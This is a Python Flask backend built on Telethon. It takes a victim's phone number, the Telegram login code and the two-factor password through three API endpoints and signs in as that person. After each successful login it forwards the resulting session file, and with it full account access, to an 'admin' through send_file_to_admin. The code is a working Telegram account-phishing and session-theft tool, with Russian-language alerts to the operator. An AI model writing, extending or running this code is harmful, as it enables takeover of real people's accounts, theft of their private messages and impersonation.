@app.route('/api/start', methods=['POST'])
def start_login():
    data = request.json
    phone = data.get('phone')
    if not phone: return jsonify({"error": "Phone required"}), 400

    async def send_code():
        client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        temp_clients[phone] = client
        send_message_to_admin(f"📞 Запрос кода для {phone}")

    asyncio.run(send_code())
    return jsonify({"status": "code_sent"})

@app.route('/api/check_code', methods=['POST'])
def check_code():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    if not phone or not code: return jsonify({"error": "Phone and code required"}), 400

    async def process():
        if phone not in temp_clients:
            client = TelegramClient(f"temp_{phone}", API_ID, API_HASH)
            await client.connect()
            temp_clients[phone] = client
        else:
            client = temp_clients[phone]

        try:
            await client.sign_in(phone=phone, code=code)
            session_file = f"temp_{phone}.session"
            if os.path.exists(session_file):
                final_name = f"session_{phone.replace('+', '')}.session"
                shutil.move(session_file, final_name)
                send_file_to_admin(final_name, phone)
            if phone in temp_clients:
                del temp_clients[phone]
            return {"status": "success"}
        except errors.SessionPasswordNeededError:
            return {"status": "password_needed"}
        except Exception as e:
            send_message_to_admin(f"❌ Ошибка: {e}")
            return {"status": "error", "message": str(e)}

    result = asyncio.run(process())
    return jsonify(result)

@app.route('/api/check_password', methods=['POST'])
def check_password():
    data = request.json
    phone = data.get('phone')
    password = data.get('password')
    if not phone or not password: return jsonify({"error": "Phone and password required"}), 400

    async def process():
        if phone not in temp_clients:
            return {"status": "error", "message": "Session expired"}
        client = temp_clients[phone]
        try:
            await client.sign_in(password=password)
            session_file = f"temp_{phone}.session"
            if os.path.exists(session_file):
                final_name = f"session_{phone.replace('+', '')}.session"
                shutil.move(session_file, final_name)
                send_file_to_admin(final_name, phone)
            if phone in temp_clients:
                del temp_clients[phone]
            return {"status": "success"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    result = asyncio.run(process())
    return jsonify(result)

